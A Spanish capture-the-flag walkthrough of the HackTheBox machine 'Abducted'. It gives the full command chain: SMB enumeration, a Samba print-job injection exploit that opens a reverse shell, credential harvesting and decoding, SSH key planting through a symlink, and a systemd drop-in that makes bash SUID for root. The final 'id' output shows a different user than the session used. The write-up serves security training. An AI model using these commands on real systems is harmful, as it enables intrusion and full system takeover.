Linux SMB CVE-2026-4480 Privilege Escalation

Máquina Abducted de HackTheBox — resolución completa paso a paso.

🔍 Introducción

Abducted es una máquina Linux de dificultad media que explota un fallo en el subsistema de impresión de Samba (CVE-2026-4480) para obtener ejecución remota de código. A partir de ahí, mediante la enumeración de archivos de configuración y el abuso de configuraciones inseguras de SMB, se logra la escalada de privilegios hasta root.

📡 Reconocimiento

Escaneo de puertos

nmap abducted.htb -sCV -A -oN abducted-default

Resultados:

  • 22/tcp → SSH (OpenSSH 9.6p1)
  • 139,445/tcp → SMB (Samba smbd 4)

No se detectaron otros puertos abiertos, por lo que el vector de ataque será SMB.

Enumeración SMB

nxc smb abducted.htb -u '' -p '' --shares

Se encontraron varios recursos compartidos, destacando:

  • HP-Reception → impresora escribible con autenticación nula.
  • projects y transfer → sin acceso anónimo.

La presencia de un share de impresora con permisos de escritura apunta directamente a la vulnerabilidad CVE-2026-4480.

💣 Explotación (CVE-2026-4480)

La vulnerabilidad permite ejecutar comandos arbitrarios a través de la descripción del trabajo de impresión (%J) sin escapar los caracteres meta del shell. El share HP-Reception es el vector ideal.

Clonar el PoC y preparar listener

git clone https://github.com/TheCyberGeek/CVE-2026-4480-PoC.git
cd CVE-2026-4480-PoC
nc -lvnp 8443

Ejecutar el exploit

python3 exploit.py 10.129.244.177 10.10.15.154 8443 -P HP-Reception

Se obtiene una shell inversa como el usuario nobody (o samba).

📁 Post‑explotación y credenciales

Una vez dentro, buscamos archivos de configuración fuera de las rutas habituales:

find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"

Aparece el archivo /opt/offsite-backup/rclone.conf con las credenciales del usuario svc-backup:

[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = [REDACTED]   # ofuscada con rclone

La contraseña está ofuscada con rclone. La decodificamos en nuestra máquina local:

rclone reveal [REDACTED]

Obtenemos la contraseña en texto plano: [REDACTED].

Esta contraseña resulta ser la misma para el usuario scott, lo que nos permite acceder por SSH.

🔑 Acceso como scott

ssh scott@10.129.244.177

Una vez autenticados, leemos la flag de usuario:

cat /home/scott/user.txt

[USER FLAG REDACTED]

⬆️ Escalada a Marcus (abuso de SMB)

Revisando la configuración de Samba, encontramos dos directivas peligrosas:

  • wide links = yes → permite enlaces simbólicos fuera del directorio compartido.
  • En el share transfer: force user = marcus → los archivos subidos serán propiedad de Marcus.

Generamos una clave SSH para Marcus y la subimos mediante smbclient aprovechando el enlace simbólico.

ssh-keygen -q -t ed25519 -N '' -f /tmp/k
ln -s /home/marcus /srv/transfer/keys
smbclient //127.0.0.1/transfer -U 'scott%[REDACTED]' -c 'mkdir keys/.ssh; put /tmp/k.pub keys/.ssh/authorized_keys'

Ahora podemos iniciar sesión como marcus:

ssh marcus@localhost -i /tmp/k

👑 Escalada a root (systemd + SUID)

El usuario marcus pertenece al grupo operators, y este tiene permisos de escritura sobre /etc/systemd/system/smbd.service.d.

Creamos un archivo daffy.conf que ejecute un comando antes de iniciar smbd:

cat > /etc/systemd/system/smbd.service.d/daffy.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF

Recargamos systemd y reiniciamos el servicio para activar el SUID:

systemctl daemon-reload
systemctl restart smbd

Verificamos que el bit SUID esté establecido:

ls -la /bin/bash
-rwsr-sr-x 1 root root ...

Finalmente, obtenemos una shell con privilegios de root:

/bin/bash -p
# id
uid=1000(scott) gid=1001(scott) euid=0(root) egid=0(root) ...

Leemos la flag de root:

cat /root/root.txt

[ROOT FLAG REDACTED]

✅ Conclusión

La máquina Abducted demuestra cómo una vulnerabilidad en Samba puede ser el punto de entrada, y cómo configuraciones inseguras (enlaces amplios, force user) combinadas con permisos excesivos en directorios de systemd pueden llevar a la toma de control total del sistema.

Lecciones aprendidas:

  • Revisar siempre los permisos de los shares SMB.
  • Deshabilitar wide links y el uso de force user en entornos críticos.
  • Restringir los permisos de escritura en directorios de configuración de systemd.
